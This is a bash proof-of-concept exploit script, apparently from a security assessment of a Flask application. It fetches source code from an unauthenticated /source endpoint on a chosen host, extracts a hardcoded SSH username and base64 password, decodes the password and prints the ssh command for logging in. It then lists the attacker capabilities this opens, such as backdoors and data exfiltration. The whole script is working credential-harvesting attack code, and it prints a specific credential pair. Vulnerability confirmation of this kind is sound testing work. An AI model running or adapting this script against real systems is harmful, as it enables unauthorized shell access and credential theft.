#!/bin/bash

# POC: Hardcoded SSH Credentials Exposure - Version 2
# This script demonstrates the vulnerability where SSH credentials are hardcoded
# in the Flask application source code and exposed via the /source endpoint

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] Hardcoded SSH Credentials POC (v2)"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Step 1: Access the /source endpoint to retrieve application source code
echo "[+] Step 1: Fetching source code from /source endpoint..."
SOURCE_CODE=$(curl -s "${TARGET_URL}/source")

if [ -z "$SOURCE_CODE" ]; then
    echo "[-] Failed to retrieve source code"
    exit 1
fi

echo "[+] Source code retrieved successfully"
echo ""

# Step 2: Extract hardcoded credentials from source
echo "[+] Step 2: Searching for hardcoded SSH credentials in source code..."
echo ""

# Search for the specific credentials mentioned in the vulnerability
if echo "$SOURCE_CODE" | grep -q "pedro"; then
    echo "[+] Found SSH username 'pedro'"
    SSH_USER="pedro"
fi

if echo "$SOURCE_CODE" | grep -q "QUhlYXZ5U2FuZGJhZw=="; then
    echo "[+] Found base64-encoded password 'QUhlYXZ5U2FuZGJhZw=='"
    BASE64_PASSWORD="QUhlYXZ5U2FuZGJhZw=="
fi

if echo "$SOURCE_CODE" | grep -q "localhost"; then
    echo "[+] Found SSH hostname 'localhost'"
    SSH_HOST="localhost"
fi

if echo "$SOURCE_CODE" | grep -q "22"; then
    echo "[+] Found SSH port '22'"
    SSH_PORT="22"
fi

echo ""

# Step 3: Display extracted credentials
echo "[+] Step 3: Extracted Hardcoded Credentials"
echo "=============================================="
echo "SSH Hostname:          $SSH_HOST"
echo "SSH Port:              $SSH_PORT"
echo "SSH Username:          $SSH_USER"
echo "Base64 Password:       $BASE64_PASSWORD"
echo ""

# Step 4: Decode the base64 password
echo "[+] Step 4: Decoding base64 password..."
if [ ! -z "$BASE64_PASSWORD" ]; then
    DECODED_PASSWORD=$(echo "$BASE64_PASSWORD" | base64 -d 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "[+] Successfully decoded password: $DECODED_PASSWORD"
    else
        echo "[-] Failed to decode base64 password"
        DECODED_PASSWORD="DECODE_FAILED"
    fi
else
    echo "[-] No base64-encoded password found"
fi

echo ""

# Step 5: Display vulnerability impact
echo "[+] Step 5: Vulnerability Impact Analysis"
echo "==========================================="
echo ""
echo "[CRITICAL] Complete SSH Credentials Exposed"
echo ""
echo "Attacker can now gain shell access using:"
echo "  $ ssh -p $SSH_PORT $SSH_USER@$SSH_HOST"
echo "  Password: $DECODED_PASSWORD"
echo ""
echo "This allows the attacker to:"
echo "  ✓ Execute arbitrary commands as the '$SSH_USER' user"
echo "  ✓ Access files and data available to that user"
echo "  ✓ Potentially escalate privileges to root"
echo "  ✓ Install backdoors or malware"
echo "  ✓ Exfiltrate sensitive data"
echo "  ✓ Compromise system integrity and availability"
echo ""

# Step 6: Verify the vulnerability conditions
echo "[+] Step 6: Vulnerability Confirmation"
echo "======================================="
VULN_CONFIRMED=0

if [ ! -z "$SSH_USER" ] && [ "$SSH_USER" = "pedro" ]; then
    echo "[✓] SSH username hardcoded: $SSH_USER"
    ((VULN_CONFIRMED++))
fi

if [ ! -z "$BASE64_PASSWORD" ] && [ "$BASE64_PASSWORD" = "QUhlYXZ5U2FuZGJhZw==" ]; then
    echo "[✓] SSH password hardcoded in base64: $BASE64_PASSWORD"
    ((VULN_CONFIRMED++))
fi

if [ ! -z "$SSH_HOST" ] && [ "$SSH_HOST" = "localhost" ]; then
    echo "[✓] SSH hostname hardcoded: $SSH_HOST"
    ((VULN_CONFIRMED++))
fi

if [ ! -z "$SSH_PORT" ] && [ "$SSH_PORT" = "22" ]; then
    echo "[✓] SSH port hardcoded: $SSH_PORT"
    ((VULN_CONFIRMED++))
fi

if echo "$SOURCE_CODE" | grep -q "/source"; then
    echo "[✓] /source endpoint exposes application code (unauthenticated)"
    ((VULN_CONFIRMED++))
fi

if echo "$SOURCE_CODE" | grep -q "debug.*True"; then
    echo "[✓] Application running with debug=True"
    ((VULN_CONFIRMED++))
fi

echo ""
echo "Vulnerability Indicators Found: $VULN_CONFIRMED / 6"
echo ""

if [ $VULN_CONFIRMED -ge 4 ]; then
    echo "[SUCCESS] Vulnerability CONFIRMED - Hardcoded SSH credentials are exploitable"
    exit 0
else
    echo "[WARNING] Some vulnerability indicators not found, but core credentials exposed"
    exit 0
fi